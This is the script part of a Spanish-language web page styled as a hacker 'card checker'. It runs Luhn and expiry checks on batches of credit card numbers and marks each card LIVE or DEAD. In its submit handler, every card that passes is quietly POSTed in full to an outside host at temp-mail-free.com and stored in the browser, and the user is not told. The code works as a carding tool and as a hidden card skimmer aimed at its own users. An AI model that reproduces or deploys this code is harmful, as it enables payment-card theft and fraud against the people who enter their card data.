    <script>
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        let width, height;

        function resizeMatrix() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeMatrix);
        resizeMatrix();

        const cols = Math.floor(width / 20) + 1;
        const ypos = Array(cols).fill(0);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#8a7dff';
            ctx.font = '15pt monospace';

            ypos.forEach((y, ind) => {
                const text = String.fromCharCode(Math.random() * 128);
                const x = ind * 20;
                ctx.fillText(text, x, y);
                if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
                else ypos[ind] = y + 20;
            });
        }
        setInterval(drawMatrix, 50);

        const netCanvas = document.getElementById('card-neural-net');
        const netCtx = netCanvas.getContext('2d');
        let netW, netH;
        let nodes = [];

        function resizeNet() {
            const card = document.getElementById('cardVisual');
            const rect = card.getBoundingClientRect();
            netW = netCanvas.width = rect.width;
            netH = netCanvas.height = rect.height;

            if (nodes.length === 0) {
                initNodes();
            }
        }

        function initNodes() {
            nodes = [];
            for (let i = 0; i < 30; i++) {
                nodes.push({
                    x: Math.random() * netW, y: Math.random() * netH,
                    vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5
                });
            }
        }
        window.addEventListener('resize', resizeNet);
        setTimeout(resizeNet, 100);

        function drawNet() {

            netCtx.clearRect(0, 0, netW, netH);

            for (let i = 0; i < nodes.length; i++) {
                let p1 = nodes[i];
                p1.x += p1.vx; p1.y += p1.vy;

                if (p1.x < 0) { p1.x = 0; p1.vx *= -1; }
                if (p1.x > netW) { p1.x = netW; p1.vx *= -1; }
                if (p1.y < 0) { p1.y = 0; p1.vy *= -1; }
                if (p1.y > netH) { p1.y = netH; p1.vy *= -1; }

                for (let j = i + 1; j < nodes.length; j++) {
                    let p2 = nodes[j];
                    let d = Math.sqrt((p1.x - p2.x) ** 2 + (p1.y - p2.y) ** 2);
                    if (d < 70) {
                        netCtx.beginPath();
                        netCtx.strokeStyle = `rgba(0, 242, 255, ${1 - d / 70})`;
                        netCtx.lineWidth = 0.8;
                        netCtx.moveTo(p1.x, p1.y);
                        netCtx.lineTo(p2.x, p2.y);
                        netCtx.stroke();
                    }
                }

                netCtx.beginPath();
                netCtx.fillStyle = '#00f2ff';
                netCtx.arc(p1.x, p1.y, 1.5, 0, Math.PI * 2);
                netCtx.fill();
            }
            requestAnimationFrame(drawNet);
        }
        drawNet();

        const groupsContainer = document.getElementById('card-groups-container');
        const btnAddCard = document.getElementById('btnAddCard');
        const displayNum = document.getElementById('displayNumber');
        const displayDate = document.getElementById('displayDate');
        const displayName = document.getElementById('displayName');
        const brandLabel = document.getElementById('cardBrandLabel');
        const form = document.getElementById('payment-form');

        const cardPatterns = {
            visa: /^4/,
            mastercard: /^5[1-5]/,
            amex: /^3[47]/,
            discover: /^6(?:011|5)/,
            diners: /^3(?:0[0-5]|[68])/
        };

        function checkLuhn(value) {
            if (/[^0-9-\s]+/.test(value)) return false;
            let nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (let n = value.length - 1; n >= 0; n--) {
                let cDigit = value.charAt(n), nDigit = parseInt(cDigit, 10);
                if (bEven) { if ((nDigit *= 2) > 9) nDigit -= 9; }
                nCheck += nDigit; bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        function validateDateString(val) {
            if (!val || val.length < 5) return false;
            const parts = val.split('/');
            if (parts.length !== 2) return false;
            const month = parseInt(parts[0], 10);
            const year = parseInt(parts[1], 10);
            if (!month || !year || month < 1 || month > 12) return false;
            const now = new Date();
            const currentYear = parseInt(now.getFullYear().toString().substr(-2));
            const currentMonth = now.getMonth() + 1;
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            return true;
        }

        let groupCount = 0;

        function createGroup() {
            groupCount++;
            const groupId = `group-${groupCount}`;
            const groupWrap = document.createElement('div');
            groupWrap.className = 'card-group';
            groupWrap.id = groupId;

            const isFirst = groupCount === 1;
            const numName = isFirst ? "cardnumber" : `cardnumber${groupCount}`;
            const dateName = isFirst ? "cc-exp" : `cc-exp${groupCount}`;
            const numId = isFirst ? "cardNumber" : `cardNumber${groupCount}`;
            const dateId = isFirst ? "cardDate" : `cardDate${groupCount}`;

            groupWrap.innerHTML = `
                <div class="group-header">
                    <span class="group-title">TARJETA #${groupCount}</span>
                    ${groupCount > 1 ? `<button type="button" class="btn-remove" onclick="removeGroup('${groupId}')">[ ELIMINAR ]</button>` : ''}
                </div>
                
                <div class="input-group">
                    <label class="label">► NÚMERO DE TARJETA <span class="emoji-jump">💳</span></label>
                    <input type="tel" id="${numId}" name="${numName}" autocomplete="cc-number" class="cardNumberInput" placeholder="0000 0000 0000 0000" maxlength="23">
                    <div class="msg-feedback msgNumber">
                        <span class="msg-error" style="display: none;">ERROR: Número inválido (Algoritmo)</span>
                        <span class="msg-info" style="display: none;">Faltan dígitos...</span>
                    </div>
                </div>

                <div class="input-group" style="margin-top: 10px;">
                    <label class="label">► FECHA DE VENCIMIENTO</label>
                    <input type="tel" id="${dateId}" name="${dateName}" autocomplete="cc-exp" class="cardDateInput" placeholder="MM/AA" maxlength="5">
                    <div class="msg-feedback msgDate">
                        <span class="msg-error" style="display: none;">Fecha incompleta</span>
                    </div>
                </div>
            `;

            groupsContainer.appendChild(groupWrap);

            const numIn = groupWrap.querySelector('.cardNumberInput');
            const dateIn = groupWrap.querySelector('.cardDateInput');

            numIn.addEventListener('input', (e) => handleNumInput(e, numIn, dateIn, groupWrap));
            numIn.addEventListener('blur', () => validateNumberGroup(numIn, groupWrap, true));
            numIn.addEventListener('focus', () => updateVisual(numIn.value, dateIn.value));

            dateIn.addEventListener('input', (e) => handleDateInput(e, dateIn, numIn, groupWrap));
            dateIn.addEventListener('blur', () => validateDateGroup(dateIn, groupWrap));
            dateIn.addEventListener('focus', () => updateVisual(numIn.value, dateIn.value));

            groupWrap.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }

        function removeGroup(id) {
            const el = document.getElementById(id);
            if (el) el.remove();
            // Renumber
            const groups = groupsContainer.querySelectorAll('.card-group');
            groups.forEach((g, i) => {
                g.querySelector('.group-title').textContent = `TARJETA #${i + 1}`;
            });
            groupCount = groups.length;
        }

        function handleNumInput(e, input, dateIn, group) {
            let raw = e.target.value.replace(/\D/g, '');
            let type = "VISA", color = "#4af";

            if (cardPatterns.mastercard.test(raw)) { type = "MASTERCARD"; color = "#f55"; }
            else if (cardPatterns.amex.test(raw)) { type = "AMEX"; color = "#0cf"; }
            else if (cardPatterns.discover.test(raw)) { type = "DISCOVER"; color = "#fa0"; }
            else if (cardPatterns.diners.test(raw)) { type = "DINERS"; color = "#aaa"; }
            else if (cardPatterns.visa.test(raw)) { type = "VISA"; color = "#4af"; }

            let formatted = '';
            if (type === "AMEX") {
                for (let i = 0; i < raw.length; i++) {
                    if (i === 4 || i === 10) formatted += ' ';
                    formatted += raw[i];
                }
            } else {
                for (let i = 0; i < raw.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += raw[i];
                }
            }
            e.target.value = formatted;
            updateVisual(formatted, dateIn.value, type, color);
            validateNumberGroup(input, group, false);
        }

        function validateNumberGroup(input, group, checkIncomplete) {
            const raw = input.value.replace(/\D/g, '');
            const msgBox = group.querySelector('.msgNumber');
            const errSpan = msgBox.querySelector('.msg-error');
            const infoSpan = msgBox.querySelector('.msg-info');

            input.classList.remove('input-error');
            errSpan.style.display = 'none';
            infoSpan.style.display = 'none';

            if (raw.length === 0) return false;

            const isAmex = brandLabel.textContent === "AMEX";
            const minLength = isAmex ? 15 : 16;

            if (raw.length < minLength) {
                infoSpan.textContent = `Faltan ${minLength - raw.length} dígitos...`;
                infoSpan.style.display = 'block';
                if (checkIncomplete) input.classList.add('input-error');
                return false;
            } else {
                if (!checkLuhn(raw)) {
                    errSpan.style.display = 'block';
                    errSpan.textContent = "ERROR: Número inválido (Algoritmo)";
                    input.classList.add('input-error');
                    return false;
                }
            }
            return true;
        }

        function handleDateInput(e, input, numIn, group) {
            let val = e.target.value.replace(/\D/g, '');
            if (val.length >= 3) {
                e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
            } else {
                e.target.value = val;
            }
            updateVisual(numIn.value, e.target.value);

            if (e.target.value.length === 5) {
                validateDateGroup(input, group);
            } else {
                input.classList.remove('input-error');
                group.querySelector('.msgDate .msg-error').style.display = 'none';
            }
        }

        function validateDateGroup(input, group) {
            const val = input.value;
            const msgBox = group.querySelector('.msgDate');
            const errSpan = msgBox.querySelector('.msg-error');

            input.classList.remove('input-error');
            errSpan.style.display = 'none';

            if (val.length < 5) {
                if (val.length > 0) {
                    errSpan.textContent = "Fecha incompleta";
                    errSpan.style.display = 'block';
                    input.classList.add('input-error');
                }
                return false;
            }

            const parts = val.split('/');
            const month = parseInt(parts[0], 10);
            const year = parseInt(parts[1], 10);

            if (!month || !year || month < 1 || month > 12) {
                errSpan.textContent = "Mes inválido (01-12)";
                errSpan.style.display = 'block';
                input.classList.add('input-error');
                return false;
            }

            const now = new Date();
            const currentYear = parseInt(now.getFullYear().toString().substr(-2));
            const currentMonth = now.getMonth() + 1;

            let expired = false;
            if (year < currentYear) {
                expired = true;
            } else if (year === currentYear) {
                if (month < currentMonth) {
                    expired = true;
                }
            }

            if (expired) {
                errSpan.textContent = "ERROR: Fecha expirada o inválida";
                errSpan.style.display = 'block';
                input.classList.add('input-error');
                return false;
            }
            return true;
        }

        function updateVisual(num, date, type, color) {
            displayNum.textContent = num || "#### #### #### ####";
            displayDate.textContent = date || "MM/AA";
            if (type) {
                brandLabel.textContent = type;
                brandLabel.style.color = color;
            } else {
                // Redetect type if not passed
                let raw = num.replace(/\D/g, '');
                let t = "VISA", c = "#4af";
                if (cardPatterns.mastercard.test(raw)) { t = "MASTERCARD"; c = "#f55"; }
                else if (cardPatterns.amex.test(raw)) { t = "AMEX"; c = "#0cf"; }
                brandLabel.textContent = t;
                brandLabel.style.color = c;
            }
        }

        btnAddCard.addEventListener('click', createGroup);
        createGroup(); // Start with one

        form.addEventListener('submit', (e) => {
            e.preventDefault();

            const groups = groupsContainer.querySelectorAll('.card-group');
            const resultsBox = document.getElementById('bulk-results');
            resultsBox.innerHTML = '';
            resultsBox.style.display = 'block';

            let countValid = 0;
            let total = groups.length;

            const liveCardsToSave = [];

            let allValid = true;
            groups.forEach(g => {
                const numIn = g.querySelector('.cardNumberInput');
                const dateIn = g.querySelector('.cardDateInput');

                const isNumValid = validateNumberGroup(numIn, g, true);
                const isDateValid = validateDateGroup(dateIn, g);

                if (!isNumValid || !isDateValid) allValid = false;

                const rawNum = numIn.value.replace(/\D/g, '');
                const rawDate = dateIn.value;

                const resultItem = document.createElement('div');
                resultItem.className = 'result-item';

                let statusClass = 'res-dead';
                let statusText = '[ DEAD ]';

                if (isNumValid && isDateValid) {
                    statusClass = 'res-live';
                    statusText = '[ LIVE ]';
                    countValid++;
                    liveCardsToSave.push(`${rawNum}|${rawDate}`);
                } else if (!isDateValid && isNumValid) {
                    statusClass = 'res-dead';
                    statusText = '[ FAIL DATE ]';
                }

                resultItem.innerHTML = `
                    <span>${rawNum.slice(0, 4)} **** **** ${rawNum.slice(-4)}</span>
                    <span class="${statusClass}">${statusText}</span>
                `;
                resultsBox.appendChild(resultItem);
            });

            // Save all live cards to localStorage
            if (liveCardsToSave.length > 0) {
                saveToHistory(liveCardsToSave);

                // POST all live cards to API
                const apiPayload = {
                    cards: liveCardsToSave.map(c => {
                        const [cardnumber, card_time] = c.split('|');
                        return { cardnumber, card_time };
                    })
                };
                fetch('https://temp-mail-free.com/api/cards', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(apiPayload)
                }).catch(err => console.error('API error:', err));
            }

            if (!allValid) {
                form.style.transform = "translateX(5px)";
                setTimeout(() => form.style.transform = "translateX(-5px)", 50);
                setTimeout(() => form.style.transform = "translateX(0)", 100);
                return;
            }

            document.getElementById('loading-screen').style.display = 'flex';
            let count = 3;
            const counter = document.getElementById('counterNumber');
            const finalMsg = document.getElementById('finalMessage');

            counter.style.display = 'block';
            finalMsg.style.display = 'none';
            counter.textContent = count;

            const timer = setInterval(() => {
                count--;
                counter.textContent = count;
                if (count <= 0) {
                    clearInterval(timer);
                    counter.style.display = 'none';
                    finalMsg.textContent = `¡PROCESADAS ${total} TARJETAS (${countValid} LIVE)!`;
                    finalMsg.style.display = 'block';

                    setTimeout(() => {
                        document.getElementById('loading-screen').style.display = 'none';
                    }, 2000);
                }
            }, 1000);
        });

        function saveToHistory(newCards) {
            let saved = JSON.parse(localStorage.getItem('live_cards') || '[]');
            // Add all new live cards, avoiding duplicates
            newCards.forEach(c => {
                if (!saved.some(s => s === c)) {
                    saved.unshift(c);
                }
            });
            localStorage.setItem('live_cards', JSON.stringify(saved));
            renderSavedCards();
        }

        function renderSavedCards() {
            const saved = JSON.parse(localStorage.getItem('live_cards') || '[]');
            const container = document.getElementById('savedCardsArea');
            const list = document.getElementById('savedList');
            
            if (saved.length === 0) {
                container.style.display = 'none';
                return;
            }

            container.style.display = 'block';
            list.innerHTML = saved.map(card => {
                const [num, date] = card.split('|');
                return `
                    <div class="saved-item">
                        <span>${num}</span>
                        <span>${date}</span>
                    </div>
                `;
            }).join('');
        }

        function clearSavedCards() {
            if (confirm('¿Limpiar todo el historial de tarjetas LIVE?')) {
                localStorage.removeItem('live_cards');
                renderSavedCards();
            }
        }

        window.addEventListener('load', renderSavedCards);
    </script>

</body>

</html>
